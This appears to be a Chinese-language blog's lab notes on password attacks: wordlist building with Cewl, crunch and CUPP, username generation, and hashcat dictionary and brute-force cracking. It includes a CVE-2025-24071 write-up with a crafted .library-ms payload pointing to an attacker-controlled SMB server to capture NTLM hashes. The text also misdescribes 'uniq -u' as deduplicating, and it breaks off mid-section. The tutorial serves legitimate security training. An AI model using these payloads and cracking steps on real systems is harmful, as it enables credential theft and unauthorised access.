<h3 id="密码分析1"><a href="#密码分析1" class="headerlink" title="密码分析1"></a>密码分析1</h3><p>拥有一个优质的密码字典对于成功实施密码攻击至关重要。了解如何生成用户名列表和密码列表同样重要。在本节中，我们将讨论如何创建针对特定目标的用户名和密码列表，并涵盖多个相关主题，包括默认密码、弱密码、泄露密码以及定制密码字典的创建方法。</p>
<h4 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h4><p>在执行密码攻击之前，值得尝试一些默认密码来测试目标服务。许多设备和系统（如交换机、防火墙、路由器等）在出厂时都会设置默认密码。在某些情况下，用户未更改默认密码，这使得系统容易受到攻击。因此，可以先尝试常见的默认组合，例如 <code>admin:admin</code>、<code>admin:123456</code> 等。如果已知目标设备的类型，还可以查询其默认密码并进行尝试。例如，若目标服务器是 Tomcat（一款轻量级开源 Java 应用服务器），则可能的默认密码包括 <code>admin:admin</code> 或 <code>tomcat:admin</code>。</p>
<p>以下是一些提供各种设备默认密码的网站列表：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://cirt.net/passwords">https://cirt.net/passwords</a></li>
<li><a target="_blank" rel="noopener" href="https://default-password.info/">https://default-password.info/</a></li>
<li><a target="_blank" rel="noopener" href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li>
</ul>
<h4 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h4><p>专业人士在长期的渗透测试和攻击分析中积累了大量的弱密码，并经常将其整合成一个大型字典。这些字典通常来源于经验总结，也可能包含已经公开的泄露密码。以下是一些常见的弱密码列表：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.skullsecurity.org/wiki/Passwords">Skull Security Passwords</a> - 包含最知名的密码合集。</li>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a></strong> - 一个庞大的密码字典集合，不仅限于密码破解用途。</li>
</ul>
<h4 id="泄露密码"><a href="#泄露密码" class="headerlink" title="泄露密码"></a>泄露密码</h4><p>由于数据泄露，密码或哈希值等敏感信息可能会被公开或出售。这些可公开或私下流传的数据通常被称为“数据转储”（dumps）。根据数据转储的内容，攻击者可能需要从中提取明文密码。在某些情况下，数据仅包含密码哈希值，需要进行破解才能获取明文密码。以下是一些包含弱密码和泄露密码的常见字典，例如 webhost、elitehacker、hak5、Hotmail、PhpBB 等公司的泄露数据：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases"><strong>SecLists&#x2F;Passwords&#x2F;Leaked-Databases</strong></a></li>
</ul>
<h4 id="组合密码字典"><a href="#组合密码字典" class="headerlink" title="组合密码字典"></a>组合密码字典</h4><p>假设我们有多个密码字典，我们可以将它们合并成一个大型文件。可以使用 <code>cat</code> 命令进行合并：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1.txt file2.txt file3.txt &gt; combined_list.txt</span><br></pre></td></tr></table></figure>

<p>为了清理合并后的密码列表并去除重复项，可以使用 <code>sort</code> 和 <code>uniq</code> 命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="定制密码字典"><a href="#定制密码字典" class="headerlink" title="定制密码字典"></a>定制密码字典</h4><p>定制密码列表是提高找到有效凭据概率的最佳方法之一。我们可以从目标网站提取有价值的信息来创建自定义密码列表。例如，企业网站通常包含与公司及其员工相关的信息，包括电子邮件地址、员工姓名等。此外，网站可能包含与企业业务相关的关键词（如产品或服务名称），而这些关键词往往可能被用于员工的密码中。</p>
<p>工具 <strong>Cewl</strong> 可用于高效爬取网站并提取字符串或关键词。Cewl 是一个强大的工具，可用于针对特定公司或目标生成密码字典。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl -w list.txt -d 5 -m 5 http://thm.labs</span><br></pre></td></tr></table></figure>

<p><strong>参数解析：</strong></p>
<ul>
<li><code>-w</code>：将爬取的内容写入文件，在此示例中为 <code>list.txt</code></li>
<li><code>-m 5</code>：仅获取长度 <strong>≥5</strong> 个字符的单词</li>
<li><code>-d 5</code>：设定爬取深度为 5（默认 2）</li>
<li><code>http://thm.labs</code>：目标网站 URL</li>
</ul>
<p>执行后，我们将获得一个包含该企业相关词汇（如员工姓名、地名、业务术语等）的较大规模密码字典。此外，生成的字典也可用于用户名枚举攻击。</p>
<p>请使用 Cewl 针对 <strong><code>https://clinic.thmredteam.com/</code></strong> 解析所有单词，并生成一个 <strong>最小长度为 8</strong> 的密码字典。请注意，我们将在后续任务中使用此密码列表！</p>
<hr>
<h4 id="用户名字典"><a href="#用户名字典" class="headerlink" title="用户名字典"></a>用户名字典</h4><p>在信息收集阶段，收集目标企业员工的姓名至关重要。我们可以从目标网站提取员工姓名，并根据不同的用户名格式生成用户名列表。例如，假设已知某员工的全名 <code>&#123;first name&#125; &#123;last name&#125;</code>（如 John Smith），我们可以生成多个可能的用户名格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;first name&#125;: john</span><br><span class="line">&#123;last name&#125;: smith</span><br><span class="line">&#123;first name&#125;&#123;last name&#125;: johnsmith</span><br><span class="line">&#123;last name&#125;&#123;first name&#125;: smithjohn</span><br><span class="line">&#123;first letter of first name&#125;&#123;last name&#125;: jsmith</span><br><span class="line">&#123;first letter of last name&#125;&#123;first name&#125;: sjohn</span><br><span class="line">&#123;first letter of first name&#125;.&#123;last name&#125;: j.smith</span><br><span class="line">&#123;first letter of first name&#125;-&#123;last name&#125;: j-smith</span><br></pre></td></tr></table></figure>

<p>幸运的是，我们可以使用 <code>username_generator</code> 工具自动生成上述用户名格式。</p>
<hr>
<h4 id="使用-username-generator-生成用户名列表"><a href="#使用-username-generator-生成用户名列表" class="headerlink" title="使用 username_generator 生成用户名列表"></a>使用 <code>username_generator</code> 生成用户名列表</h4><p>首先，克隆 <code>username_generator</code> 仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/therodri2/username_generator.git</span><br></pre></td></tr></table></figure>

<p>然后，进入 <code>username_generator</code> 目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd username_generator</span><br></pre></td></tr></table></figure>

<p>运行以下命令查看工具帮助信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 username_generator.py -h</span><br></pre></td></tr></table></figure>

<p><strong>示例输出：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: username_generator.py [-h] -w wordlist [-u]</span><br><span class="line"></span><br><span class="line">Python script to generate user lists for bruteforcing!</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            Show this help message and exit</span><br><span class="line">  -w wordlist, --wordlist wordlist  Specify path to the wordlist</span><br><span class="line">  -u, --uppercase       Also produce uppercase permutations (Disabled by default)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="生成自定义用户名列表"><a href="#生成自定义用户名列表" class="headerlink" title="生成自定义用户名列表"></a>生成自定义用户名列表</h4><p>我们将 <code>John Smith</code> 保存到 <code>users.lst</code> 文件，并使用 <code>username_generator</code> 生成用户名组合：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;John Smith&quot; &gt; users.lst</span><br><span class="line">python3 username_generator.py -w users.lst</span><br></pre></td></tr></table></figure>

<p><strong>示例输出：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john</span><br><span class="line">smith</span><br><span class="line">j.smith</span><br><span class="line">j-smith</span><br><span class="line">j_smith</span><br><span class="line">j+smith</span><br><span class="line">jsmith</span><br><span class="line">smithjohn</span><br></pre></td></tr></table></figure>



<p>这只是一个自定义用户名生成器的示例，您可以探索更多工具，或者使用自己熟悉的编程语言编写类似的工具！</p>
<h1 id="CVE-2025-24071：通过-RAR-ZIP-提取和-library-ms-文件发生-NTLM-哈希泄漏"><a href="#CVE-2025-24071：通过-RAR-ZIP-提取和-library-ms-文件发生-NTLM-哈希泄漏" class="headerlink" title="CVE-2025-24071：通过 RAR&#x2F;ZIP 提取和 .library-ms 文件发生 NTLM 哈希泄漏"></a><a target="_blank" rel="noopener" href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html#title">CVE-2025-24071：通过 RAR&#x2F;ZIP 提取和 .library-ms 文件发生 NTLM 哈希泄漏</a></h1><p>当一个 <strong>特制的 <code>.library-ms</code> 文件</strong>（其中包含 SMB 路径）被压缩进 <strong>RAR&#x2F;ZIP 归档</strong> 并随后解压时，<strong>Windows 资源管理器</strong> 会 <strong>自动解析</strong> 该文件的内容。这种行为源于 Windows 资源管理器的 <strong>内置索引和预览机制</strong>，即使用户 <strong>未手动打开或点击</strong> 该文件，系统仍会主动处理其中的内容，以 <strong>生成预览、缩略图或索引元数据</strong>。</p>
<p>.library-ms 文件的作用</p>
<p><code>.library-ms</code> 文件是一种 <strong>基于 XML 的格式</strong>，Windows 资源管理器将其 <strong>信任</strong> 用于定义 <strong>搜索路径和库位置</strong>。在解压过程中，Windows 的 <strong>索引服务</strong> 以及资源管理器的 <strong>内置文件解析机制</strong> 会立即解析 <code>.library-ms</code> 文件的内容，以 <strong>渲染适当的图标、缩略图或元数据信息</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;</span><br><span class="line">    &lt;simpleLocation&gt;&lt;url&gt;\\attacker-controlled-smb-server\share&lt;/url&gt;&lt;/simpleLocation&gt;</span><br><span class="line">&lt;/libraryDescription&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在提取时，Windows 资源管理器会尝试自动解析此 SMB 路径（\192.168.1.116\shared）以收集元数据并索引文件信息。此操作触发了从受害者系统到攻击者控制的 SMB 服务器的隐式 NTLM 身份验证握手。因此，受害者的 NTLMv2 哈希值会在没有显式用户交互的情况下发送出去。</p>
<p>该漏洞的出现是因为 Windows 资源管理器隐式信任 .library-ms 文件，并在文件从归档中提取后立即自动处理某些文件类型。攻击者利用这种隐式信任和自动文件处理行为泄露凭据，这些凭据随后可以用于传递哈希攻击或离线破解 NTLM 哈希。</p>
<p>自动文件处理观察 使用 Procmon，我们可以清晰地观察到，在提取 .library-ms 文件后，Explorer.exe 和搜索协议主机（SearchProtocolHost.exe）等索引服务会自动执行以下操作：</p>
<p>CreateFile：文件被资源管理器自动打开。 ReadFile：读取文件内容以提取元数据。 QueryBasicInformationFile：执行元数据查询。 CloseFile：处理完文件后关闭文件。 此外，SearchProtocolHost.exe 作为 Windows 文件索引服务的一部分被调用。在 Explorer.exe 完成初步处理后，索引服务会重新打开并读取文件以将其内容编入索引。这进一步确认了文件提取后自动处理的行为：</p>
<p>CreateFile, ReadFile, QueryBasicInformationFile, CloseFile：由 SearchProtocolHost.exe 执行，将文件内容添加到搜索索引中。 这些操作充分证明了 Windows 在提取文件后立即自动处理文件，而无需任何显式的用户交互。Explorer.exe 和 SearchProtocolHost.exe 会自动读取并处理 .library-ms 文件的 XML 内容，启动连接到嵌入其中的 SMB 路径的尝试。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327221001731.png" alt="image-20250327221001731"></p>
<p>监听网卡</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327185941924.png" alt="image-20250327185941924"></p>
<p>运行poc.py填入文件名和攻击机的ip</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327190227716.png" alt="image-20250327190227716"></p>
<p>然后解压生成的压缩包</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327185957727.png" alt="image-20250327185957727"></p>
<p>即拿到了用户名和hash</p>
<h3 id="密码分析2"><a href="#密码分析2" class="headerlink" title="密码分析2"></a>密码分析2</h3><h4 id="Keyspace-Technique键空间技术"><a href="#Keyspace-Technique键空间技术" class="headerlink" title="Keyspace Technique键空间技术"></a>Keyspace Technique键空间技术</h4><p>Crunch 可根据您指定的条件创建密码字典。<br> 生成的输出可以显示在屏幕上、保存到文件中，或传输到另一个程序。</p>
<p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch [最小长度] [最大长度] [其他选项]</span><br></pre></td></tr></table></figure>

<p>请参考 <code>man</code> 页面以获取 crunch 的使用说明和示例。</p>
<hr>
<p>下面的示例创建了一个包含所有可能 2 个字符组合的字典，字符范围包括 <code>0-4</code> 和 <code>a-d</code>。我们可以使用 <code>-o</code> 参数指定输出文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ crunch 2 2 01234abcd -o crunch.txt</span><br></pre></td></tr></table></figure>

<p>Crunch 现在将生成以下数据量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">243 字节</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br></pre></td></tr></table></figure>

<p>Crunch 生成的行数：<code>xx</code><br> <strong>crunch: 100% 完成输出生成</strong></p>
<p>部分示例输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ cat crunch.txt</span><br><span class="line">00</span><br><span class="line">01</span><br><span class="line">02</span><br><span class="line">03</span><br><span class="line">04</span><br><span class="line">0a</span><br><span class="line">0b</span><br><span class="line">0c</span><br><span class="line">0d</span><br><span class="line">10</span><br><span class="line">...</span><br><span class="line">cb</span><br><span class="line">cc</span><br><span class="line">cd</span><br><span class="line">d0</span><br><span class="line">d1</span><br><span class="line">d2</span><br><span class="line">d3</span><br><span class="line">d4</span><br><span class="line">da</span><br><span class="line">db</span><br><span class="line">dc</span><br><span class="line">dd</span><br></pre></td></tr></table></figure>

<p>值得注意的是，crunch 生成的字典大小取决于密码的长度和字符组合选项。例如，以下命令创建了一个包含 <strong>8 个字符</strong>的字典，字符范围包括 <strong>0-9</strong>、<strong>a-f（小写）</strong> 和 <strong>A-F（大写）</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch 8 8 0123456789abcdefABCDEF -o crunch.txt</span><br></pre></td></tr></table></figure>

<p>生成的文件大小为 <strong>459GB</strong>，包含 <strong>54,875,873,536</strong> 个单词。</p>
<p>Crunch 还允许使用 <code>-t</code> 选项指定字符集，生成符合特定格式的密码。例如，以下是一些可用的占位符：</p>
<ul>
<li><code>@</code> - 小写字母</li>
<li><code>,</code> - 大写字母</li>
<li><code>%</code> - 数字</li>
<li><code>^</code> - 特殊字符（包括空格）</li>
</ul>
<p>假设我们已知部分密码，并且密码以 <strong>“pass”</strong> 开头，后面跟着两个数字，我们可以使用 <code>%</code> 占位符匹配数字，生成符合该模式的字典：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ crunch 6 6 -t pass%%</span><br></pre></td></tr></table></figure>

<p>生成的数据量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">700 字节</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br></pre></td></tr></table></figure>

<p><strong>crunch 生成的行数：100</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pass00</span><br><span class="line">pass01</span><br><span class="line">pass02</span><br><span class="line">pass03</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="CUPP-常见用户密码生成器"><a href="#CUPP-常见用户密码生成器" class="headerlink" title="CUPP - 常见用户密码生成器"></a>CUPP - 常见用户密码生成器</h4><p><strong>CUPP（Common User Passwords Profiler）</strong> 是一个基于 Python 的自动化交互工具，可用于创建自定义密码字典。如果已知目标的部分信息（如生日、宠物名、公司名称等），CUPP 可以利用这些信息生成可能的密码。此外，CUPP 还支持 <strong>1337&#x2F;leet 模式</strong>，可将字母替换为类似的数字，例如：</p>
<ul>
<li><strong>a → 4</strong></li>
<li><strong>i → 1</strong></li>
<li><strong>o → 0</strong></li>
<li><strong>s → 5</strong><br>更多信息可参考其 GitHub 仓库。</li>
</ul>
<h5 id="运行-CUPP"><a href="#运行-CUPP" class="headerlink" title="运行 CUPP"></a>运行 CUPP</h5><p>运行 CUPP 需要安装 <strong>Python 3</strong>。首先，使用 <code>git</code> 克隆 GitHub 仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ git clone https://github.com/Mebus/cupp.git</span><br></pre></td></tr></table></figure>

<p><strong>克隆输出</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cloning into &#x27;cupp&#x27;...</span><br><span class="line">remote: Enumerating objects: 237, done.</span><br><span class="line">remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237</span><br><span class="line">Receiving objects: 100% (237/237), 2.14 MiB | 1.32 MiB/s, done.</span><br><span class="line">Resolving deltas: 100% (125/125), done.</span><br></pre></td></tr></table></figure>

<p>然后，进入 CUPP 目录并运行 <code>cupp.py</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py</span><br></pre></td></tr></table></figure>

<p><strong>CUPP 启动画面</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">___________</span><br><span class="line">  cupp.py!                 # Common</span><br><span class="line">     \                     # User</span><br><span class="line">      \   ,__,             # Passwords</span><br><span class="line">       \  (oo)____         # Profiler</span><br><span class="line">          (__)    )\</span><br><span class="line">             ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]</span><br><span class="line">                           [ Mebus | https://github.com/Mebus/]</span><br></pre></td></tr></table></figure>

<p>CUPP 提供了以下选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help         显示帮助信息</span><br><span class="line">  -i, --interactive  交互模式，基于用户输入创建密码字典</span><br><span class="line">  -w FILENAME        改进已有字典，例如结合 WyD.pl 输出</span><br><span class="line">  -l                 从在线仓库下载大型密码字典</span><br><span class="line">  -a                 解析 Alecto 数据库中的默认用户名和密码</span><br><span class="line">  -v, --version      显示程序版本</span><br><span class="line">  -q, --quiet        静默模式（不显示 banner）</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="交互模式示例："><a href="#交互模式示例：" class="headerlink" title="交互模式示例："></a>交互模式示例：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py -i</span><br></pre></td></tr></table></figure>

<p>CUPP 会要求输入关于目标的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 输入有关受害者的信息以创建密码字典</span><br><span class="line">[+] 如果不清楚某些信息，可直接回车跳过！</span><br><span class="line"></span><br><span class="line">&gt; 名字:</span><br><span class="line">&gt; 姓氏:</span><br><span class="line">&gt; 昵称:</span><br><span class="line">&gt; 生日 (DDMMYYYY):</span><br><span class="line"></span><br><span class="line">&gt; 配偶的名字:</span><br><span class="line">&gt; 配偶的昵称:</span><br><span class="line">&gt; 配偶的生日 (DDMMYYYY):</span><br><span class="line"></span><br><span class="line">&gt; 孩子的名字:</span><br><span class="line">&gt; 孩子的昵称:</span><br><span class="line">&gt; 孩子的生日 (DDMMYYYY):</span><br><span class="line"></span><br><span class="line">&gt; 宠物的名字:</span><br><span class="line">&gt; 公司名称:</span><br><span class="line"></span><br><span class="line">&gt; 是否要添加一些关键词？Y/[N]:</span><br><span class="line">&gt; 是否要在密码末尾添加特殊字符？Y/[N]:</span><br><span class="line">&gt; 是否要在密码末尾添加随机数字？Y/[N]:</span><br><span class="line">&gt; 是否启用 Leet 模式 (1337)? Y/[N]:</span><br><span class="line"></span><br><span class="line">[+] 正在生成密码字典...</span><br><span class="line">[+] 排序并去重...</span><br><span class="line">[+] 将字典保存为 .....txt，包含 ..... 组密码。</span><br><span class="line">&gt; 是否启用极速打印模式？(Y/n)</span><br></pre></td></tr></table></figure>

<p>最终，CUPP 会生成一个基于输入信息的自定义密码字典。</p>
<hr>
<h5 id="下载预置密码字典"><a href="#下载预置密码字典" class="headerlink" title="下载预置密码字典"></a>下载预置密码字典</h5><p>可以使用 <code>-l</code> 选项下载预置的密码字典：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py -l</span><br></pre></td></tr></table></figure>

<p>CUPP 提供多种类别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1   Moby            14      french          27      places</span><br><span class="line">2   afrikaans       15      german          28      polish</span><br><span class="line">3   american        16      hindi           29      random</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>密码字典来源</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Alecto-默认用户名和密码数据库"><a href="#Alecto-默认用户名和密码数据库" class="headerlink" title="Alecto 默认用户名和密码数据库"></a>Alecto 默认用户名和密码数据库</h5><p>CUPP 还可从 Alecto 数据库获取默认的用户名和密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py -a</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 下载 alectodb.csv.gz...</span><br><span class="line">[+] 导出至 alectodb-usernames.txt 和 alectodb-passwords.txt</span><br><span class="line">[+] 完成。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>总结</strong>：</p>
<ul>
<li><strong>crunch</strong> 用于生成基于特定规则的密码字典。</li>
<li><strong>CUPP</strong> 适用于根据已知信息创建自定义密码字典，并支持下载现有密码字典。</li>
</ul>
<h3 id="离线攻击1"><a href="#离线攻击1" class="headerlink" title="离线攻击1"></a>离线攻击1</h3><h4 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a><strong>字典攻击</strong></h4><p>字典攻击是一种通过使用已知单词或短语来猜测密码的技术。字典攻击完全依赖于事先收集或生成的单词列表。为了成功进行此类攻击，选择或创建最佳的候选词列表至关重要。</p>
<p>让我们利用前面学习的生成单词列表的知识，来演示如何执行字典攻击。这里我们将使用 Hashcat 进行一次离线字典攻击，这是一款常用的哈希破解工具。</p>
<p>假设我们获得了以下哈希值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f806fc5a2a0d5ba2471600758452799c</span><br></pre></td></tr></table></figure>

<p>我们想要使用字典攻击来破解它。首先，我们至少需要了解以下信息：</p>
<ol>
<li>该哈希值的类型是什么？</li>
<li>我们要使用哪个单词列表？或者可以采用哪种攻击模式？</li>
</ol>
<p>为了识别哈希类型，我们可以使用 <code>hashid</code> 或 <code>hash-identifier</code> 等工具。例如，在本例中，<code>hash-identifier</code> 认为该哈希可能是 <strong>MD5</strong>。</p>
<p>需要注意的是，破解哈希所需的时间取决于所使用的硬件（CPU 和&#x2F;或 GPU）。</p>
<h5 id="执行字典攻击"><a href="#执行字典攻击" class="headerlink" title="执行字典攻击"></a><strong>执行字典攻击</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><strong>运行结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line">f806fc5a2a0d5ba2471600758452799c:rockyou</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: MD5</span><br><span class="line">Hash.Target......: f806fc5a2a0d5ba2471600758452799c</span><br><span class="line">Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)</span><br><span class="line">Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 40/40 (100.00%)</span><br><span class="line">Candidates.#1....: 123456 -&gt; 123123</span><br></pre></td></tr></table></figure>

<p><strong>参数解析：</strong></p>
<ul>
<li><code>-a 0</code>  设置攻击模式为字典攻击。</li>
<li><code>-m 0</code>  设置哈希类型为 <strong>MD5</strong>（要查看其他哈希类型，可运行 <code>hashcat -h</code>）。</li>
<li><code>f806fc5a2a0d5ba2471600758452799c</code> 目标哈希值，可以是单个哈希，也可以是包含多个哈希的文件。</li>
<li><code>/usr/share/wordlists/rockyou.txt</code>  作为攻击的字典文件。</li>
</ul>
<h5 id="查看破解结果"><a href="#查看破解结果" class="headerlink" title="查看破解结果"></a><strong>查看破解结果</strong></h5><p>如果哈希已经破解，我们可以使用 <code>--show</code> 选项查看已破解的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f806fc5a2a0d5ba2471600758452799c:rockyou</span><br></pre></td></tr></table></figure>

<p>最终破解出的密码是 <code>rockyou</code>。</p>
<hr>
<h4 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a><strong>暴力破解攻击</strong></h4><p>暴力破解攻击是一种常见的攻击方式，攻击者尝试使用所有可能的密码组合，以获取对个人账户的未授权访问。</p>
<p><strong>字典攻击和暴力破解攻击的主要区别在于：</strong></p>
<ul>
<li><strong>字典攻击</strong> 使用包含所有可能密码的单词列表。</li>
<li><strong>暴力破解攻击</strong> 则尝试所有可能的字符组合。例如：<ul>
<li>如果某个银行账户的 PIN 码由 <strong>4 位数字</strong> 组成，我们可以从 <code>0000</code> 到 <code>9999</code> 进行尝试。</li>
<li>在其他情况下，也可以将数字或字母序列附加到已有的单词上，例如：<code>admin0</code>、<code>admin1</code>、…、<code>admin9999</code>。</li>
</ul>
</li>
</ul>
<p>在 Hashcat 中，我们可以使用 <strong>字符集选项</strong> 来生成特定的密码组合。</p>
<h5 id="查看-Hashcat-可用的字符集"><a href="#查看-Hashcat-可用的字符集" class="headerlink" title="查看 Hashcat 可用的字符集"></a><strong>查看 Hashcat 可用的字符集</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat --help</span><br></pre></td></tr></table></figure>

<p>部分可用字符集：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">? | 字符集</span><br><span class="line">===+=========</span><br><span class="line"> l | abcdefghijklmnopqrstuvwxyz</span><br><span class="line"> u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line"> d | 0123456789</span><br><span class="line"> h | 0123456789abcdef</span><br><span class="line"> H | 0123456789ABCDEF</span><br><span class="line"> s |  !&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br><span class="line"> a | ?l?u?d?s</span><br><span class="line"> b | 0x00 - 0xff</span><br></pre></td></tr></table></figure>

<h5 id="使用暴力破解攻击模式"><a href="#使用暴力破解攻击模式" class="headerlink" title="使用暴力破解攻击模式"></a><strong>使用暴力破解攻击模式</strong></h5><p>假设我们需要生成 <strong>4 位数</strong> 的 PIN 码组合，我们可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 3 ?d?d?d?d --stdout</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1234</span><br><span class="line">0234</span><br><span class="line">2234</span><br><span class="line">3234</span><br><span class="line">9234</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>参数解析：</strong></p>
<ul>
<li><code>-a 3</code>  设置攻击模式为 <strong>暴力破解攻击</strong>。</li>
<li><code>?d?d?d?d</code>  指定密码格式为 <strong>4 位数字（0000 到 9999）</strong>。</li>
<li><code>--stdout</code>  将结果直接打印到终端，而不是执行实际的哈希破解。</li>
</ul>
<hr>
<h5 id="破解-MD5-哈希的-4-位-PIN"><a href="#破解-MD5-哈希的-4-位-PIN" class="headerlink" title="破解 MD5 哈希的 4 位 PIN"></a><strong>破解 MD5 哈希的 4 位 PIN</strong></h5><p>假设我们需要破解以下 <strong>MD5</strong> 哈希值，它的密码是一个 4 位数 PIN 码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">05A5CF06982BA7892ED2A6D38FE832D6</span><br></pre></td></tr></table></figure>

<p>我们可以运行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d</span><br></pre></td></tr></table></figure>

<p><strong>运行结果：</strong></p>
